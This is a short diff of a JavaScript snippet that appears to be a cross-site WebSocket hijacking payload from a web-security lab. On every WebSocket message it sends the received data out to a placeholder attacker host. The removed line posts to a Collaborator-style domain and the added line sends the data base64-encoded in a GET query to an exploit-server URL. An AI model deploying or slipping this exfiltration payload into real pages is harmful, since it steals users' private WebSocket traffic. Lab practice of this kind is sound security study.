@@ -4,6 +4,6 @@ ws.onopen = function() {
   ws.send("READY");
 }
 ws.onmessage = function(event) {
-  fetch('https://xxxxxxxxxCOLLABORATORxxxxxxxxxxx.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
+  fetch('https://exploit-xxxxxxxxxxxATTACKERxxxxxxxxxxxxx.exploit-server.net/log?data=' + btoa(event.data), {method: 'GET', mode: 'no-cors'});
 }
 </script>
